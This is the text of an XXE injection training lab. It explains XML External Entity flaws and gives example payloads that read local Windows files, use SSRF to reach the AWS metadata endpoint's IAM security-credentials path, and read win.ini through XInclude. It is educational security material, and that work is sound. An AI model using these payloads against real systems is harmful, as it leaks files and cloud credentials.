⚠️ XXE Injection Lab

XML External Entity (XXE) vulnerability demonstration environment for educational purposes.

📖 What is XXE?

XXE occurs when XML input is parsed insecurely, allowing attackers to read local files, perform server-side request forgery (SSRF), and access internal resources.

⚠️ Educational Use Only — Run these labs only on this local environment.

🧪 Lab 1 – File Read via XXE

Submit an XML payload with a SYSTEM entity pointing to a local file. The server reads and returns the file contents.

💡 Example payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<user><name>&xxe;</name></user>

🧪 Lab 2 – SSRF via XXE

Submit an XML payload with a SYSTEM entity pointing to an internal HTTP URL. The server fetches it and returns the response — simulating AWS EC2 metadata exposure.

💡 Try these URLs in order:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<!-- Step 2: http://169.254.169.254/latest/meta-data/iam/security-credentials/ -->
<!-- Step 3: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin -->

🧪 Lab 3 – XInclude Attack

When you cannot control the full XML document, use XInclude to pull in a local file — bypassing the need for a DOCTYPE declaration.

💡 Example payload:

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///C:/Windows/win.ini" parse="text"/>
</foo>
